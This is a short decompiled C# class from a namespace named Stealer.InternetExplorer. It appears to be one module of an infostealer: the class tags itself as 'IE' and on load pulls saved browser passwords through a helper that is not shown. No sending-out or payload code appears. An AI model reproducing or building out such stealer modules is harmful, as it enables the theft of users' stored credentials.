using System;

namespace Stealer.InternetExplorer
{
	// Token: 0x02000017 RID: 23
	internal sealed class Recovery : Browser
	{
		// Token: 0x06000079 RID: 121 RVA: 0x0000564C File Offset: 0x0000384C
		public Recovery()
		{
			this.type = "IE";
		}

		// Token: 0x0600007A RID: 122 RVA: 0x00005664 File Offset: 0x00003864
		protected override void Load()
		{
			base.Load();
			this.pPasswords = cPasswords.Get();
		}
	}
}
